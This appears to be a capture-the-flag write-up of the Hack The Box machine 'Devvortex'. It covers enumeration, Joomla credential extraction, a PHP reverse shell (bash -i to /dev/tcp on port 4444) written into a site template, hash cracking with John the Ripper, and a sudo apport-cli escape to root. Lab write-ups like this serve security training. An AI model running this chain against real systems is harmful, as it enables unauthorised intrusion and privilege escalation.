---
title: "Devvortex (linux)"
category: ["Devvortex (linux)"]
---


nmap -sT machine_ip = to scan the IP and get information about which ports are open

We try to access the webpage via IP through a browser but can't, so we edit the /etc/hosts file with nano and add the domain devvortex.htb with its IP.

When accessing the page, we inspect the code and see that the contact section is useless as it's just HTML that can't store information.

**gobuster dir -u http://devvortex.htb/ -w /path/to/seclists/Discovery/Web-Content/common.txt -r **

Gobuster is used to scan for directories and files on web servers  
dir specifies you're scanning directories  
-u url indicates the website URL  
-w path specifies the path to the wordlist file you'll use (here using common words from seclists)

git clone https://github.com/danielmiessler/SecLists.git

This command downloads seclists in case it's not already in our OS.

We access seclists and verify its creation with ls: cd SecLists  
![Pasted image 20240217163422](/VaultSite/wiki-images/Pasted%20image%2020240217163422.png)

Found nothing, so we check for subdomains via DNS  
![Pasted image 20240217163906](/VaultSite/wiki-images/Pasted%20image%2020240217163906.png)
Same command but changing the URL to just the name, modifying the file path, and starting with dns instead of dir since that's what we're looking for.

We add the subdomain to etc/hosts.

Once accessed, we need to add robots.txt to the URL - it's like an entry sign telling you where you can/can't go and who's allowed.

We see an administrator/  
We access  
![Pasted image 20240217170309](/VaultSite/wiki-images/Pasted%20image%2020240217170309.png)
Try default credentials - no luck.  
Knowing it's Joomla, we scan it with joomscan  
![Pasted image 20240217170556](/VaultSite/wiki-images/Pasted%20image%2020240217170556.png)
We get the version  
Command is **perl joomscan.pl -u http://your-joomla-site.com**  
![Pasted image 20240217170703](/VaultSite/wiki-images/Pasted%20image%2020240217170703.png)
We get vulcheck info by modifying this command  
![Pasted image 20240218165355](/VaultSite/wiki-images/Pasted%20image%2020240218165355.png)
First install jq  
![Pasted image 20240218165802](/VaultSite/wiki-images/Pasted%20image%2020240218165802.png)
We obtain critical info like login details  
![Pasted image 20240218165956](/VaultSite/wiki-images/Pasted%20image%2020240218165956.png)
From here we extract login credentials  
![Pasted image 20240218170156](/VaultSite/wiki-images/Pasted%20image%2020240218170156.png)
Now we access the admin templates and in the index template we insert a line of code for a reverse shell:
`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.246/4444 0>&1'")`  
![Pasted image 20240218171319](/VaultSite/wiki-images/Pasted%20image%2020240218171319.png)
The IP part needs to be changed to ours.

We configure the listener  
![Pasted image 20240218171531](/VaultSite/wiki-images/Pasted%20image%2020240218171531.png)  
![Pasted image 20240218171605](/VaultSite/wiki-images/Pasted%20image%2020240218171605.png)  
We save and  
![Pasted image 20240218172706](/VaultSite/wiki-images/Pasted%20image%2020240218172706.png)  
We run whoami and see we're www-data.

We try to access user.txt but lack permissions  
![Pasted image 20240218173218](/VaultSite/wiki-images/Pasted%20image%2020240218173218.png)  
To gain permissions, we noticed they had a MySQL database earlier.  
We access with mysql -u lewis -p  
![Pasted image 20240218173548](/VaultSite/wiki-images/Pasted%20image%2020240218173548.png)  
We access the database and see the Joomla one  
![Pasted image 20240218174211](/VaultSite/wiki-images/Pasted%20image%2020240218174211.png)  
We discover a user named logan who can also be found graphically in Joomla  
![Pasted image 20240218174253](/VaultSite/wiki-images/Pasted%20image%2020240218174253.png)  
We create a file called hash and put the hash inside, then use John the Ripper for brute force attacks  
![Pasted image 20240218174550](/VaultSite/wiki-images/Pasted%20image%2020240218174550.png)  
Need to change the path and decompress rockyou.txt.gz  
![Pasted image 20240218180501](/VaultSite/wiki-images/Pasted%20image%2020240218180501.png)  
![Pasted image 20240218180924](/VaultSite/wiki-images/Pasted%20image%2020240218180924.png)  
We access via ssh logan@10.10.11.242 with the obtained password.  
Now we can view user.txt and get the first flag  
![Pasted image 20240218181154](/VaultSite/wiki-images/Pasted%20image%2020240218181154.png)  
Logan has these sudo permissions  
![Pasted image 20240218181142](/VaultSite/wiki-images/Pasted%20image%2020240218181142.png)  
And we see we can use sudo /usr/bin/apport-cli  
![Pasted image 20240218181330](/VaultSite/wiki-images/Pasted%20image%2020240218181330.png)  
We use f because it's for reporting bugs or reading existing ones  
![Pasted image 20240218181443](/VaultSite/wiki-images/Pasted%20image%2020240218181443.png)  
Choose 1  
Then 2 and execute to view the report  
![Pasted image 20240218181720](/VaultSite/wiki-images/Pasted%20image%2020240218181720.png)  
Everything is in vi and we'll use the ! syntax  
![Pasted image 20240218181833](/VaultSite/wiki-images/Pasted%20image%2020240218181833.png)  
Since we executed this with sudo, we might have special permissions, so we'll use !/bin/bash - this tells the system to use bash to read it  
![Pasted image 20240218182009](/VaultSite/wiki-images/Pasted%20image%2020240218182009.png)  
And we access root.txt  
![Pasted image 20240218182549](/VaultSite/wiki-images/Pasted%20image%2020240218182549.png)